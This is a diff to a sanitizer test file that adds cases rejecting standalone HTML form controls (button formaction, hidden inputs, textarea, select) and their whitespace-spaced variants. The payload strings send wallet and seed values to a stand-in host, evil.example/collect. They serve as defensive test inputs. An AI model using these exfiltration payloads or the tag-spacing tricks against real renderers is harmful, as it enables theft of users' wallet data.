@@ -26,6 +26,16 @@ rejects('Intro.\n\n<  base   href="https://evil.example/">', 'spaced <base>');
 rejects('Intro.\n\n<form action="https://evil.example/collect" method="GET"><input name="wallet"><button>Go</button></form>', 'plain <form>');
 rejects('Intro.\n\n<  form   action="https://evil.example/collect">', 'spaced <form>');
 
+// Standalone form controls are blocked too: #184 blocks <form>, but a lone
+// <button formaction="https://..."> or <input type="hidden" name="wallet"> still
+// renders and can exfiltrate data without a wrapping form or flagged scheme.
+rejects('Intro.\n\n<button formaction="https://evil.example/collect">Send</button>', 'plain button formaction');
+rejects('Intro.\n\n<  button   formaction="https://evil.example/collect">', 'spaced button');
+rejects('Intro.\n\n<input type="hidden" name="wallet" value="5Grw...">', 'plain hidden input');
+rejects('Intro.\n\n<  input   type="text" name="seed">', 'spaced input');
+rejects('Intro.\n\n<textarea name="note">secret</textarea>', 'plain textarea');
+rejects('Intro.\n\n<select name="wallet"><option>5Grw...</option></select>', 'plain select');
+
 // Plain dangerous URL schemes remain blocked.
 rejects('See [x](javascript:alert(1)).', 'plain javascript:');
 rejects('See [x](vbscript:msgbox(1)).', 'plain vbscript:');
